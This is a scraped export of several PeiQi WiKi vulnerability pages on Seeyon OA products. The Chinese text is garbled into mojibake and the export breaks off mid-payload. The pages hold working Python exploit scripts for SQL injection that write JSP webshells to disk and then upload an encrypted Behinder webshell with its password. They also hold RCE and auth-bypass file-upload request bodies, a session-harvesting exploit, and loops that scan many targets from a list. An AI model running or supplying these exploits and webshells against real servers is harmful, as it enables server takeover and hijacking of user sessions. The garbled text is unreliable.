t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E è¿æ¥æœ¨é©¬ æ¼æ´åˆ©ç”¨POC [!NOTE] EXPæœ¨é©¬ä¸Šä¼  import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if 'åºå·' in response.text and \"@@basedir\" in response.text and response.status_code == 200: OA_dir = re.findall(r'>(.*)\\\\UFseeyon\\\\', response.text)[0] OA_dir = OA_dir[:2] + '/' + OA_dir[3:] print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´, å®‰è£…è·¯å¾„ä¸º:{} \\033[0m\".format(target_url, OA_dir)) webshell_name = \"test_upload{}.jsp\".format(random.randint(1,999)) OA_dir = OA_dir + \"/UFseeyon/OA/tomcat/webapps/yyoa/{}\".format(webshell_name) POC_2(target_url, OA_dir, webshell_name) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url), e) def POC_2(target_url, OA_dir, webshell_name): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27\".format(OA_dir) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if 'already' in response.text and response.status_code == 200: print(\"\\033[32m[o] æ–‡ä»¶å†™å…¥æœ¨é©¬ä¸Šä¼ å¤±è´¥ï¼Œç›®æ ‡å·²å­˜åœ¨ç›¸åŒæ–‡ä»¶ï¼Œè¯·é‡æ–°è¿è¡Œ\\033[0m\") elif \"No Data\" in response.text and response.status_code == 200: print(\"\\033[32m[o] æ–‡ä»¶å†™å…¥æœ¨é©¬ä¸Šä¼ æˆåŠŸï¼Œä¸Šä¼ è·¯å¾„ä¸º {}\\033[0m\".format(OA_dir)) POC_3(target_url, webshell_name) else: print(\"\\033[31m[x] ç›®æ ‡ {} æœ¨é©¬ä¸Šä¼ å¤±è´¥ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url), e) def POC_3(target_url, webshell_name): rebe_webshell = \"testwebshell{}.jsp\".format(random.randint(1,999)) vuln_url = target_url + \"/yyoa/{}?f={}\".format(webshell_name, rebe_webshell) data = \"t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ï¼š{}\\033[0m\".format(vuln_url)) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] æœ¨é©¬ä¸Šä¼ æˆåŠŸ, è·¯å¾„ä¸º:{}/yyoa/{}\\033[0m\".format(target_url, rebe_webshell)) print(\"\\033[32m[o] è¯·ä½¿ç”¨å†°èè¿æ¥ï¼Œå¯†ç ä¸º: rebeyond\\033[0m\") else: print(\"\\033[31m[x] æœ¨é©¬ä¸Šä¼ å¤±è´¥ï¼Œå¯èƒ½è¢«æ‹¦æˆª \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) [!NOTE] å¤šä¸ªç›®æ ‡æµ‹è¯• import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,ä¸‹è½½åœ°å€:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Seeyon_OA_A6_test.jsp_SQL_injection PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 17:32:50 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 setextno.jsp SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A6 setextno.jsp SQLæ³¨å…¥æ¼æ´.html","title":"è‡´è¿œOA A6 setextno.jsp SQLæ³¨å…¥æ¼æ´","keywords":"","body":" æ¼æ´æè¿° è‡´è¿œOA A6 setextno.jsp å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œå¹¶å¯ä»¥é€šè¿‡æ³¨å…¥å†™å…¥webshellæ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA A6 FOFA [!NOTE] title=\"è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶.A6\" æ¼æ´å¤ç° è®¿é—®å¦‚ä¸‹Urlï¼Œå…¶ä¸­å«æœ‰ unionæ³¨å…¥ http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# æŸ¥çœ‹webè·¯å¾„ å†™å…¥æ–‡ä»¶ä¸Šä¼ æœ¨é©¬ http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp'),4# å‰©ä¸‹çš„æ­¥éª¤å‚è€ƒå¦ä¸€ç¯‡ è‡´è¿œOA A6 test.jsp SQLæ³¨å…¥æ¼æ´ æ¼æ´åˆ©ç”¨POC [!NOTE] å¤šä¸ªç›®æ ‡ import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"c4ca4238a0b923820dcc509a6f75849b\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Seeyon_OA_A6_setextno.jsp_SQL_injection PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 17:37:06 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´.html","title":"è‡´è¿œ OA A8 htmlofficeservlet RCEæ¼æ´","keywords":"","body":"è‡´è¿œ OA A8 htmlofficeservlet RCEæ¼æ´ CNVD-2019-19299 æ¼æ´æè¿° è¯¥æ¼æ´æœ€æ—©äº6æœˆ26å·å·¦å³ï¼Œæœ‰å®‰å…¨å‚å•†å‘å‡ºæ¼æ´é¢„è­¦ã€‚ è¿œç¨‹æ”»å‡»è€…åœ¨æ— éœ€ç™»å½•çš„æƒ…å†µä¸‹å¯é€šè¿‡å‘ URL /seeyon/htmlofficeservlet POST ç²¾å¿ƒæ„é€ çš„æ•°æ®å³å¯å‘ç›®æ ‡æœåŠ¡å™¨å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå†™å…¥æˆåŠŸåå¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤è¿›è€Œæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚ FOFA [!NOTE] title=\"è‡´è¿œA8-V5ååŒç®¡ç†è½¯ä»¶ V6.1sp1\" å½±å“ç‰ˆæœ¬ [!NOTE] è‡´è¿œA8-V5ååŒç®¡ç†è½¯ä»¶V6.1sp1 è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶V7.0ã€V7.0sp1ã€V7.0sp2ã€V7.0sp3 è‡´è¿œA8+ååŒç®¡ç†è½¯ä»¶V7.1 æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ç«™ç‚¹ http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet å‡ºç°å¦‚ä¸‹å›¾å“åº”ï¼Œåˆ™å¯èƒ½å«æœ‰æ¼æ´ ä½¿ç”¨POSTè¯·æ±‚å‘å‡ºå¦‚ä¸‹è¯·æ±‚åŒ… DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce å‡ºç°å¦‚å›¾å“åº”åˆ™ä¸ºä¸Šä¼ æˆåŠŸ è®¿é—® http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir æ¼æ´åˆ©ç”¨POC Gobyä¸­å«æœ‰æ¼æ´æ£€æµ‹POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´.html","title":"è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´","keywords":"","body":"è‡´è¿œOA getSessionList.jsp Sessionæ³„æ¼æ¼æ´ æ¼æ´æè¿° é€šè¿‡ä½¿ç”¨å­˜åœ¨æ¼æ´çš„è¯·æ±‚æ—¶ï¼Œä¼šå›æ˜¾éƒ¨åˆ†ç”¨æˆ·çš„Sessionå€¼ï¼Œå¯¼è‡´å‡ºç°ä»»æ„ç™»å½•çš„æƒ…å†µ å½±å“ç‰ˆæœ¬ [!NOTE] æœªçŸ¥ æ¼æ´å¤ç° æºç  \\r\\n\"; outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; outXML += \"\\r\\n\"; } out.println(outXML); %> ä»ä¸Šé¢çš„ä»£ç å¯çŸ¥ï¼Œå½“cmdå‚æ•°ä¸ºgetAllæ—¶ï¼Œä¾¿å¯è·å–åˆ°æ‰€æœ‰ç”¨æˆ·çš„SessionID ,è¯·æ±‚ http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll å›æ˜¾Sessionåˆ™å­˜åœ¨æ¼æ´ é€šè¿‡æ›¿æ¢ Sessionå³å¯ç™»é™†ç³»ç»Ÿ æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è‡´è¿œOA A6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/https/getSessionList.jsp?cmd=getAll\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,Sessionåœ°å€:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA ajax.do ç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è‡´è¿œOA/è‡´è¿œOA ajax.do ç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627.html","title":"è‡´è¿œOA ajax.do ç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627","keywords":"","body":"è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 æ¼æ´æè¿° è‡´è¿œOAæ˜¯ä¸€å¥—åŠå…¬ååŒç®¡ç†è½¯ä»¶ã€‚è¿‘æ—¥ï¼Œå¥‡å®‰ä¿¡CERTç›‘æµ‹åˆ°è‡´è¿œOAçš„ç›¸å…³æ¼æ´ä¿¡æ¯ã€‚ç”±äºè‡´è¿œOAæ—§ç‰ˆæœ¬æŸäº›æ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œä»¥åŠéƒ¨åˆ†å‡½æ•°å­˜åœ¨è¿‡æ»¤ä¸è¶³ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œå¯åœ¨æ— éœ€ç™»å½•çš„æƒ…å†µä¸‹ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚è‡´è¿œOAå®˜æ–¹å·²é’ˆå¯¹è¯¥æ¼æ´æä¾›è¡¥ä¸ã€‚é‰´äºæ¼æ´å±å®³è¾ƒå¤§ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«åº”ç”¨è¡¥ä¸æ›´æ–°ã€‚ æ¼æ´å½±å“ [!NOTE] è‡´è¿œOA V8.0 è‡´è¿œOA V7.1ã€V7.1SP1 è‡´è¿œOA V7.0ã€V7.0SP1ã€V7.0SP2ã€V7.0SP3 è‡´è¿œOA V6.0ã€V6.1SP1ã€V6.1SP2 è‡´è¿œOA V5.x è‡´è¿œOA G6 æ¼æ´å¤ç° é€šè¿‡è¯·æ±‚åˆ¤æ–­æ˜¯å¦å¯èƒ½å­˜åœ¨æ¼æ´ http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do æŸ¥çœ‹æ˜¯å¦å‡ºç°å¦‚ä¸Šå›¾å¼‚å¸¸ï¼Œè‹¥å­˜åœ¨åˆ™å¯èƒ½å‡ºç°æ¼æ´ å‡ºç°å¼‚å¸¸ï¼šjava.lang.NullPointerException:null ç„¶åè°ƒç”¨æœªæˆæƒçš„æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸Šä¼ webshellæ–‡ä»¶ POCè¯·æ±‚åŒ…å¦‚ä¸‹ POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%